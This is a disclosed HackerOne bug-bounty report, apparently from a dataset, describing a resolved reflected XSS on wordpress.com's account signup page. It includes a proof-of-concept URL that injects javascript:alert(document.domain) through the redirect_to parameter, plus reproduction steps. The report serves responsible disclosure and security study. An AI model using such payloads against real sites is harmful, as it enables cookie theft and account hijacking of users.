---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2055132'
original_report_id: '2055132'
title: reflected xss in https://wordpress.com/start/account/user
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: automattic
created_at: '2023-07-07T15:28:52.376Z'
disclosed_at: '2023-11-15T11:22:58.648Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 39
asset_identifier: wordpress.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# reflected xss in https://wordpress.com/start/account/user

## Metadata

- HackerOne Report ID: 2055132
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: automattic
- Disclosed At: 2023-11-15T11:22:58.648Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
xss after login at https://wordpress.com/start/account/user?variationName=free&redirect_to=javascript:alert(document.domain)

## Platform(s) Affected:
web

## Steps To Reproduce:

  1. auth normally
  1. go to https://wordpress.com/start/account/user?variationName=free&redirect_to=javascript:alert(document.domain) **while already authenticated** and click continue
  1. xss procs

## Supporting Material/References:

█████

## Impact

XSS can be used to steal cookies, modify html content, and much more

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
